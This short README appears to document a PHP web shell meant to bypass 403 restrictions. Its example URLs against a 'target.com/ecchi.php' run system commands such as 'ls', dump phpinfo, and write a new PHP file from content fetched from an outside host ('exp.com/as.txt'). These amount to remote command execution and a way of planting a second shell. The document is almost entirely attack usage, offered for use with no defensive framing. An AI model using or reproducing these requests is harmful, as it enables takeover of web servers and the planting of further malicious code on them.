# 403-bypass-shell-use-range-function

## Example Usage
```
http://target.com/ecchi.php?a=system&ecchi[]=ls

get phpinfo
http://target.com/ecchi.php?a=phpinfo&ecchi[]=-3

create file
http://target.com/ecchi.php?a=sum&ecchi[]=(url file ex: http://exp.com/as.txt)&ecchi[]=(name file ex: as.php)
```

## LICENSE
[GNU GPL v3](LICENSE)
